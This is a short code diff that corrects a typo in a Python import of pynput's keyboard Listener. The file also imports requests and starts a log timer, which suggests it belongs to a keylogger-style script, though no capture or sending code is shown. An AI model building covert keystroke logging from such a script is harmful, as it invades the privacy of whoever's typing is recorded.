@@ -3,7 +3,7 @@
 import requests
 import time
 import os
-from pynput.keyboard import Listner
+from pynput.keyboard import Listener
 
 startlog = time.time()
 
